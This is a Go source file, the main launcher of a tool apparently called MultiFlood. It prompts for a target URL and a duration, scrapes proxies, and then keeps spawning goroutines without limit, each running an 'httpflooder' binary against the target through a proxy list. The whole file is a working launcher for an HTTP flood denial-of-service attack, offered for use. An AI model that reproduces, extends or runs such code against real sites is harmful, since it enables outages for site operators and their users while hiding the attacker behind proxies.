package main

import (
	"Z3NTL3/MultiFlood/child"
	"Z3NTL3/MultiFlood/scraper"
	"fmt"
	"strings"
	"sync"
	osTm "time"
)

func main() {
	var target string
	var time int

	workerPool := new(sync.WaitGroup) // full cpu usage because we didnt lower GOMAXPROCS

	for {
		if target == "" || !strings.Contains(target, "http://") && !strings.Contains(target, "https://") {
			fmt.Printf("> Target: ")
			fmt.Scanln(&target)
		}

		if !strings.Contains(target, "http://") && !strings.Contains(target, "https://") {
			fmt.Printf("\x1b[31m\x1b[1mInvalid target, should have http:// or https://\x1b[0m\n")
			continue
		}

		fmt.Printf("> Time: ")
		fmt.Scanf("%d", &time)

		break
	}

	fmt.Println()
	dots := "."
	for i := 0; i < 3; i++ {
		fmt.Printf("\rInitializing%s", dots)
		dots += "."
		osTm.Sleep(osTm.Millisecond * 800)
	}

	th := 1
	scraper.ScrapeSomeProxies()

	defer workerPool.Wait()
	for {
		// spawn processes, pool idles until a core is free and ready to be used
		workerPool.Add(1)
		go func() {
			defer workerPool.Done()

			th += 1
			commando := child.CommandoInfo{Write: fmt.Sprintf("./httpflooder %s %d 3000 proxy.txt", target, time), ThreadNumber: th}
			commando.SpawnProcess()
			osTm.Sleep(osTm.Millisecond * 100)
		}()

	}
}
